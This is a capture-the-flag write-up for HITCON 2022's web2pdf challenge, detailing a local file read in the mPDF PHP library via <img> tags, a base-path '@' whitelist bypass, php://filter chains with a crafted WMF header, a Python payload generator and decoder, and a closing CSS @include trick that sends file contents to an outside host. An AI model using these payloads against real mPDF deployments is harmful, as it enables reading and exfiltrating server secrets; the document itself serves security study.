---
title: HITCON CTF 2022 web2pdf Writeup
publish_date: 2022-11-27
---

web2pdf is a web challenge which allows us to convert any webpage into a pdf file.
Our team, [🇫🇷🛹🐻](https://ctftime.org/team/195788) were first to solve the challenge, with emily and hashkitten being immensely helpful in solving this challenge.


# Initial Analysis

I started off as any person would, checking out the public instance and getting a feel for the application.

![Inputting a URL into the webpage](assets/hitcon22_web2pdf/webpage.png)

I started by converting everyone's favourite website into a webpage - my website.

![[hexf.me](https://hexf.me/) as a PDF](assets/hitcon22_web2pdf/hexfme-pdf.png)

Minus the shitty CSS on my website, it made a request to my website and rendered it to a pdf.

As an aside, I loved the captchas - lots of fruit on plates:

![Fruit on plates captcha](assets/hitcon22_web2pdf/plate-captcha.png)

From this analysis we determined there were parts which:
* downloaded HTML source from a URL
* transformed the HTML/CSS into a PDF

# Source Code Analysis

The authors for this challenge were nice, providing both a button on the webpage to view the source.

We started with the Dockerfile, noting the base image being `php:8-apache`, the installation of `gd` and `mbstring` php extensions with their dependencies, and a package we had never heard of `mpdf/mpdf`.

```dockerfile
FROM php:8-apache

RUN apt update && apt install -y \
        libfreetype6-dev \
        libjpeg62-turbo-dev \
        libpng-dev \
        git \
        libonig-dev \
    && docker-php-ext-configure gd --with-freetype --with-jpeg \
    && docker-php-ext-install -j$(nproc) gd \
    && docker-php-ext-install mbstring

COPY --from=composer/composer /usr/bin/composer /usr/bin/composer
RUN cd /var/www/ && composer require mpdf/mpdf
RUN chmod -R 733 /var/www/vendor/mpdf/mpdf/tmp
```

Continuing on, the other important file was `src/index.php`, which contained the source code (less the hcaptcha verification, which we quickly ruled out as being a point of attack).

```php
<?php
error_reporting(0);
require_once __DIR__ . '/../vendor/autoload.php';
require_once __DIR__ . '/hcaptcha.php';

if (isset($_GET['source']))
    die(preg_replace('#hitcon{\w+}#', 'h1tc0n{flag}', show_source(__FILE__, true)));


if (isset($_POST['url'])) {
    if (!verify_hcaptcha()) die("Captcha verification failed");
    $url = $_POST['url'];
    if (preg_match("#^https?://#", $url)) {
        $html = file_get_contents($url);
        $mpdf = new \Mpdf\Mpdf();
        $mpdf->WriteHTML($html);
        $mpdf->Output();
        exit;
    } else {
        die('Invalid URL');
    }
}

?>


<!-- snipped - just the HTML webpage stuff -->

<?php  /* $FLAG = 'hitcon{redacted}' */ ?>
```

First thing we noticed was the location of the flag - at the end of the source, in PHP tags so we don't get served it and in a comment so it doesn't get evaluated - a clear indicator we are looking for a local-file read exploit.

The next thing we noticed was we could have viewed the source without downloading the app, by browsing to `?source` - also turns out there was a "View Source" button.

From our previous toying with the website we indeed do find our HTML downloading and HTML to PDF parts.

Downloading the HTML requires that we start our url with a `http://` or `https://`, thus we can't just use a `file://` URL. It then grabs the HTML using `file_get_contents`.
This is interesting as it means we could use remote paths on **every** `file_get_contents` call, which may come in handy later.

Converting the HTML to a PDF file is then handled by the [mpdf](https://github.com/mpdf/mpdf) library through 2 calls - `WriteHTML` which takes in the HTML and parses it, then `Output`, which will display the output as a PDF to the user before exiting on the following line.

This code looked very robust, so we turned our attention to the mpdf library, looking for possible old exploits which may be useful.
Note that we are using the latest version of `mpdf`, so we won't beable to use these in full.

# MPDF Research

Doing a bit of research, we found a handful of security-related GitHub issues for mpdf:
* [Local File Read and SSRF vulnerability via img tags](https://github.com/mpdf/mpdf/issues/1763) (Open)
* [Insecure PHP deserialization through phar:// wrapper.](https://github.com/mpdf/mpdf/issues/949) (Closed)
* [phar:// deserialization and weak randomness of temporary file name may lead to RCE](https://github.com/mpdf/mpdf/issues/1381) (Closed)

First off we found our local file read issue we are looking for, on a 9 day old issue at the time of writing.
This issue was mostly useless as it said to contact the issue author via email for details - we thought that was a bit cheaty, so we didn't go down that route.
I say mostly, because the title gives an indication of what we are using - `img` tags.

I did a bit of testing and found we could use HTML such as
```html
<img src="/etc/passwd">
```
which instead of doing the sane thing of grabbing from say `https://hexf.me/etc/passwd`, is fetching from the local file system (we will come back to why shortly).

Instead of including the `/etc/passwd` file like we would like, we are instead greated by a fatal error (locally, after error reporting was enabled).

```
Fatal error: Uncaught Mpdf\MpdfImageException: Error parsing image file - image type not recognised and/or not supported by GD imagecreate (/etc/passwd)
```

This was quite an interesting discovery to see that the file is indeed being read, just it cannot convertthe image properly into a PDF because its technically not an image file.


The second issue involves using `phar://` URLs, which uses one of PHP's interesting quirks - stream wrappers.
Stream wrappers are custom schemes to URLs which you can use in all the file methods withing PHP to pull files from archives or the POST body for example.
The fix for this issue was to simply whitelist 3 schemes `http`, `https` and `file` for us, although if we could update the mpdf settings, we could add more.

The third and final issue we looked at followed on from the second, adding a blacklist to the `orig_src` attribute of images.
The `orig_src`, when provided is used over the regular `src` attribute on an image. I'm not entirely sure why we are allowed to provide this attribute, but nonetheless we can.


From the research we identified a few key points which will become useful for exploiting:
* We are dealing with `<img>` tags and their sources
* `<img>` tags have both a `src` and an `orig_src` attribute, with `src` being used as a fallback if `orig_src` is not provided or is invalid.
* Source attributes are whitelisted to only allow `file`, `http` and `https` schemes


# MPDF Code Review

Circling back to our first test, where we used the path `/etc/passwd` and got results, we wanted to know why mpdf allowed us to provide a local path.
Following the source a bit, we found a class called the `AssetFetcher`, with an interesting method [`fetchDataFromPath`](https://github.com/mpdf/mpdf/blob/3819711a98b062ddcd2c12f6334335d8c6ae3da1/src/AssetFetcher.php#L31).

```php
public function fetchDataFromPath($path, $originalSrc = null)
{
    /**
     * Prevents insecure PHP object injection through phar:// wrapper
     * @see https://github.com/mpdf/mpdf/issues/949
     * @see https://github.com/mpdf/mpdf/issues/1381
     */
    $wrapperChecker = new StreamWrapperChecker($this->mpdf);

    if ($wrapperChecker->hasBlacklistedStreamWrapper($path)) {
        throw new \Mpdf\Exception\AssetFetchingException('File contains an invalid stream. Only ' . implode(', ', $wrapperChecker->getWhitelistedStreamWrappers()) . ' streams are allowed.');
    }

    if ($originalSrc && $wrapperChecker->hasBlacklistedStreamWrapper($originalSrc)) {
        throw new \Mpdf\Exception\AssetFetchingException('File contains an invalid stream. Only ' . implode(', ', $wrapperChecker->getWhitelistedStreamWrappers()) . ' streams are allowed.');
    }

    $this->mpdf->GetFullPath($path);

    return $this->isPathLocal($path) || ($originalSrc !== null && $this->isPathLocal($originalSrc))
        ? $this->fetchLocalContent($path, $originalSrc)
        : $this->fetchRemoteContent($path);
}
```

This method is called from 2 main places - the `ImageProcessor` and the `CSSManager`. We ruled out the `CSSManager` as we knew that our exploit would require images, although we did find an interesting possile exploit discussed later in the writeup.


From the `ImageProcessor`, a call is made to this method providing our `src` attribute as `$path`, and `orig_src` as `$originalSrc`.
The method starts by checking if either of our paths contain blacklisted stream wrappers. [If the path does not contain `://`, this check passes](https://github.com/mpdf/mpdf/blob/3819711a98b062ddcd2c12f6334335d8c6ae3da1/src/File/StreamWrapperChecker.php#L24).
This is then followed by calling `GetFullPath` on `$path`, which we will come back to later.
We then enter a ternary operator nightmare, which in its essence evaluates to:
* If `$path` is a local path, or we have a `$originalSrc` AND that path is local, fetch the path locally
* Else, fetch the path remotely

If our path was a remote path, which due to a [bad `isPathLocal` check which only checks for the presence of a scheme](https://github.com/mpdf/mpdf/blob/3819711a98b062ddcd2c12f6334335d8c6ae3da1/src/AssetFetcher.php#L116), will actually error out on a `file://` as fetching remotely [makes an HTTP request](https://github.com/mpdf/mpdf/blob/3819711a98b062ddcd2c12f6334335d8c6ae3da1/src/AssetFetcher.php#L86), which obviously doesn't work when your querying a `file://` url.


However, if we do have a local path (i.e. one which doesn't contain `://`) our request is handled a little differently.

```php
public function fetchLocalContent($path, $originalSrc)
{
    $data = '';

    if ($originalSrc && $this->mpdf->basepathIsLocal && $check = @fopen($originalSrc, 'rb')) {
        fclose($check);
        $path = $originalSrc;
        $this->logger->debug(sprintf('Fetching content of file "%s" with local basepath', $path), ['context' => LogContext::REMOTE_CONTENT]);

        return $this->contentLoader->load($path);
    }

    if ($path && $check = @fopen($path, 'rb')) {
        fclose($check);
        $this->logger->debug(sprintf('Fetching content of file "%s" with non-local basepath', $path), ['context' => LogContext::REMOTE_CONTENT]);

        return $this->contentLoader->load($path);
    }

    return $data;
}
```

This method will firstly try open the `$originalSrc` path with `fopen` before calling `$this->contentLoader->load`, which actually just ends up making a call to `file_get_contents` with no additional checks. 
Failing this, it will fall through to opening `$path`, our `src` attribute.

At this point, we were set on trying to use a stream wrapper, as these are quite powerful in the PHP world and may allow us to encode our file as a valid image for inclusion in the PDF.

Stream wrappers require that we access them through file operations, rather than HTTP requests, so we needed to force any images we request to take the `fetchLocalContent` path, essentially meaning the path cannot contain `://`.

Summarizing all this, if we want to use a stream wrapper, we would need to:
* Bypass scheme whitelist check
* Force retreval through `fetchLocalContent`


# Bypassing the Scheme Whitelist

After hitting many dead-ends trying to bypass this whitelist, among many other different methods attempted, we went to sleep for the night (or at this point morning).

Circling back to the previous section where we found a call to `$this->mpdf->GetFullPath($path);`, which was the only thing we didn't look into as it didn't care for its return value.
With nothing to go on so far and nothing to lose, we took a dive into this method and what we found was a gold mine.


It turned out that [`GetFullPath`](https://github.com/mpdf/mpdf/blob/3819711a98b062ddcd2c12f6334335d8c6ae3da1/src/Mpdf.php#L11508) was actually doing something - modifying the path in-place, prefixing it with the base path.

What this ment is that the base path, which wasn't checked anywhere for a scheme would be prepended to our URL.
Thus, we could use the base path, which is set with

```html
<base href="">
```

and then use an `<img>` which does the last-mile portion of the URL:

```html
<img src="/">
```

and what do you know, it doesn't work.

Through some debugging, we actually found the source is resolved super early on [here](https://github.com/mpdf/mpdf/blob/3819711a98b062ddcd2c12f6334335d8c6ae3da1/src/Mpdf.php#L13838), before being passed into the AssetFetcher:

```php
if (trim($path) != '' && !(stristr($e, "src=") !== false && substr($path, 0, 4) == 'var:') && substr($path, 0, 1) != '@') {
    $path = htmlspecialchars_decode($path); // mPDF 5.7.4 URLs
    $orig_srcpath = $path;
    $this->GetFullPath($path);
    $regexp = '/ (href|src)="(.*?)"/i';
    $e = preg_replace($regexp, ' \\1="' . $path . '"', $e);
}
```

Interestingly enough, the `$orig_srcpath` shows up again, this time containing our path before it is prefixed with our basepath.
This was a simple bypass though, because of the last check of that `if` - `substr($path, 0, 1) != '@'`
If we start the `src` with an `@`, we will skip over this early resolving.

```html
<img src="@/">
```

With that, we have bypassed the scheme whitelist, and on top of that, have also forced `fetchLocalContent` as the `orig_srcpath` can also be set as an attribute.

# Exfiltrating the Flag

With the power of a stream wrapper in our hands, we set out to craft the payload which would exfiltrate the flag through the PDF.

One limitation of a stream wrapper is that we can only realistilcly prepend data to the file on disk through a `php://filter` path.

Initially we were trying to use a SVG file, starting the file with `<svg><text>`, but the data wasn't being put into the PDF because there wasn't a `</text>` tag at the end.
We did have the creative idea to have the type-guesser think our file was an SVG by starting it with
```xml
<svg><!--</svg>-->
```
which would pass the regex, but wouldn't help us grab the flag.

Following our failed endeavour, we looked at binary formats as they typically prefix all the data with the length of the data - ideal in our case because we can't add anything to the end.

We went down the route of a `WMF` file, as it was a vector format, which had a relatively lenient parser built directly into mPDF, which would [copy polygon point data directly into the PDF](https://github.com/mpdf/mpdf/blob/a8a22f4874157e490d41b486053a20bec42e182c/src/Image/Wmf.php#L216).
This way we aren't fighting any compression, like we would had we chosen a format such as `JPEG`.
After talking with other teams, they settled for `BMP`, which would serve the same purpose here.

The Windows Meta File (`WMF`) is a file format used on Microsoft Windows for storing images.
An extract from the [MS-WMF specification](https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-WMF/%5bMS-WMF%5d.pdf) is provided below.

> A WMF metafile is a series of variable-length records, called WMF records, that contain graphics
> drawing commands, object definitions and properties. The metafile begins with a header record, which
> includes the metafile version, its size, and the number of objects it defines. A WMF metafile is "played
> back" when its records are converted to a format understood by a specific graphics device.

Our parser implements only a slight fraction of the 213 page specification provided by Microsoft, including functions such as the `PolyPolygon`.
Each metafile record contains 3 main parts - size,  function and parameters.

| 4 Bytes | 2 Bytes  | (Size - 6) bytes |
| ------- | -------- | ---------------- |
|  Size   | Function |    Parameters    |

We were interested mainly in 1 command - `PolyPolygon`, which was selected as it read a variable number of parameters, and put them directly into the PDF for us.


```php
case 0x0538: // PolyPolygon
    $coords = unpack('s' . ($size - 3), $parms);
    $numpolygons = $coords[1];
    $adjustment = $numpolygons;
    for ($j = 1; $j <= $numpolygons; $j++) {
        $numpoints = $coords[$j + 1];
        for ($i = $numpoints; $i > 0; $i--) {
            $px = $coords[2 * $i + $adjustment];
            $py = $coords[2 * $i + 1 + $adjustment];
            if ($i == $numpoints) {
                $wmfdata .= $this->_MoveTo($px, $py);
            } else {
                $wmfdata .= $this->_LineTo($px, $py);
            }
        }
        $adjustment += $numpoints * 2;
    }
```

The code here simply unpacked `size - 3` shorts from the parameters, parsing them out into:

<table>
    <tr>
        <th>No. Polygons</th>
        <th>No. Points</th>
        <th>X</th>
        <th>Y</th>
    </tr>
    <tr>
        <td></td>
        <td></td>
        <td colspan="2">Per Point</td>
    </tr>
    <tr>
        <td></td>
        <td colspan="3">Per Polygon</td>
    </tr>
</table>


If we had 1 polygon, this would make our life a whole lot easier - so in our data we prefixed we also set that.

We also had to set the size of our canvas through `SetWindowOrg` and `SetWindowExt` functions, which were also placed in our prefixed data.


We then put together the following code to generate payloads for us, so we could vary the number of points easily.
We need to be able to vary the no. points as we couldn't easily guess the number of bytes we need to consume for the flag, so this would be a game of trial and error.
```py
n_points = 20 # No. x/y point pairs to include

sz = (n_points * 2 + 6).to_bytes(4, byteorder='little')
n = (n_points).to_bytes(2, byteorder='little')

pay = b"\xd7\xcd\xc6\x9a" + # Magic Bytes
    (b"A" * 36) + # Padding to sufficient lenggth
    # [ 5 bytes size ][ func ][x,y,w,h = 0x7f]
    b"\x05\x00\x00\x00\x0b\x02\x7f\x7f\x7f\x7f" + # Set canvas origin (x/y)
    b"\x05\x00\x00\x00\x0c\x02\x7f\x7f\x7f\x7f" + # Set canvas size (w/h)
    sz + # Size of PolyPolygon message
    b"\x38\x05" + # PolyPolygon Func
    b"\x01\x00" + # 1 polygon
    n + # of N points
    b"AA" # Padding to make payload size multiple of 3
```

Circling back to our php filter chains, we could use them to [prepend data](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html) to the original source which we are trying to read.

To ensure we didn't accidently call any functions in over-hanging records, we base64-encoded all the data, which would ensure there are no bytes in the range `0x00 - 0x0F` which would be considered as functions in mpdf, as all the supported functions in mpdf's Wmf parser require one of these lower values.

After encoding all this data, it took a bit to write us a decoder to access the PDF streams and pull in this data.
Luckily, a library `pdfminer` was available which allowed us to quickly extract the data from the PDF, which by this point has been transformed into a text-based format, from our original binary format:

```
29744 21324 l
29744 21324 l
29257 21324 l
31050 13154 l
19265 22618 l
30521 18529 l
17734 31332 l
29744 21836 l
29744 21324 l
29744 21324 l
29744 21324 l
29744 21324 l
29744 21324 l
29744 21324 l
29744 21324 l
16705 31051 l
```

This format consisted of x/y coordinates, followed by either `l` (line) or `m` (move), althrough I never actually found any move instructions as we only had 1 polygon.
The idea was simple from here, extract the x/y coordinates, and parse them back into bytes, which was done with the following code:

```python
from pdfminer.pdfdocument import PDFDocument, PDFNoOutlines, PDFXRefFallback
from pdfminer.pdfparser import PDFParser
from pdfminer.pdftypes import PDFStream, PDFObjRef, resolve1, stream_value

# Load up our PDF file
fp = open("/home/thobson/Downloads/mpdf.pdf", "rb")
doc = PDFDocument(PDFParser(fp), None)

# Polygon point instructions
dstring = ""

# Loop over all the objects in the PDF
for xref in doc.xrefs:
    for objid in xref.get_objids():
        obj = doc.getobj(objid)
        if obj is None:
            continue
        
        # Find a stream which provides "Type", which identifies our vector point data
        if isinstance(obj, PDFStream) and "Type" in obj.attrs:
            # Grab the data ito dstring
            dstring = obj.get_data().decode("ascii")

# Extract coordinates
coords = [line.split(" ") for line in dstring.split("\n") if len(line.strip()) > 0]
coords = [(int(c[1]), int(c[0])) for c in coords if c[-1] in "lm"]

# Flatten the coordinates, and reverse the array - if you look at the PHP code carefully it actually adds the points backwards
dat = [x for c in coords for x in c][::-1]

final_data = b''

# Loop over each coordinate and extract the low and high bytes, adding this to the final data
for byte_pair in dat:
    bb = byte_pair >> 8
    ba = byte_pair & 0xFF

    final_data += bytes([ba, bb])

# Print the final data, less the first 2 `AA` padding bytes
print(final_data[2:].decode("ascii"))
```

We ran into a slight issue when seeking the `n_points`, as 1 point was the equivilent of 12 characters in the source. So, if we were say 6 characters short of the flag, we couldn't increment by another lot of 12, as we would now overrun the file and error out, getting no data.
Instead, we made use of converting UTF8 -> UTF7 -> UTF8 -> UTF7 alot, which produced lots of padding on special characters such as `?`, `<` and `>`, which conveniently were around the end of the file.

```
+------------------------ADw-/form+------------------------AD4
+------------------------ADw-/section+------------------------AD4
+------------------------ADw-/article+------------------------AD4
+------------------------ADw-/main+------------------------AD4
+------------------------ADw-script src+------------------------AD0AIg-https://js.hcaptcha.com/1/api.js+------------------------ACI async defer+------------------------AD4APA-/script+------------------------AD4
+------------------------ADw-/body+------------------------AD4
```

With all the vectors in place, we slowly incremented the `n_points` value, testing on the challenge server, filling in plenty of captchas in the mean-time until we ended up with the following:

```
+------------------------ADw?php  /+------------------------ACo +------------------------ACQ-FLAG +------------------------AD0 'hitcon+------------------------AHs-Parse+------------------------AF8-Document+------------------------AF8-Failed+------------------------AF8-QAQ+------------------------AF8-aOHiV6hD9wp29yYim3HJc1G5sbuiToskIiHRTCaq6iw+------------------------AH0' +-------------------
```

which could be decoded.

> **Flag**
> hitcon{Parse_Document_Failed_QAQ_aOHiV6hD9wp29yYim3HJc1G5sbuiToskIiHRTCaq6iw} 

# CSS Manager Possible Exploit

We didn't investigate this very throughly, but the CSS manager implemented `@include` in a very weak way, which would allow us to include a local file, between 2 parts of a file we control:

```css
img{
    my-cool-property: '@include url(/local/file.css)'
}
```

However, in practice we found we could only include `.css` files, which didn't make this a viable method to exfil the flag which was in a `.php` file.

However, if for some reason, your companies secrets were stored in a `.css` file, this method could be used to exfil the data, even without retrieving the PDF.
This happens because we could import it into say the `background-image` property, prepending our own URL as follows:

```css
div {
    background-image: 'https://exfil.hexf.me/?data=@include url(/local/file.css)'
}
```
which when any div at all exists, will trigger the mpdf library to try download the file, noting that the `@include` will be resolved first, causing data to be leaked to us.